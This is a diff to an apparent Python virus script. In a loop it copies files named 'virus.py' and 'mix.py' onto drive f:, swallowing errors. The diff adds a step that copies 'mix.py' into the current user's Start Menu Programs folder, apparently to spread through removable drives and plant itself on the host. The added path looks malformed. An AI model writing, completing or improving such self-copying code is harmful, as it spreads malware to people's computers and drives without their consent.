@@ -2,8 +2,9 @@ import shutil
 import ctypes
 import time
 import os
-timer = 0
 
+user = os.getlogin()
+timer = 0
 while True:
     time.sleep(5)
     pwd = os.getcwd()
@@ -22,6 +23,7 @@ while True:
         try:
             cp_virus = shutil.copy('virus.py','f:')
             cp_mix = shutil.copy('mix.py','f:')
+            cp_mix2 = shutil.copy('mix.py','c:Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs'%user)
         except:
             pass
     else:
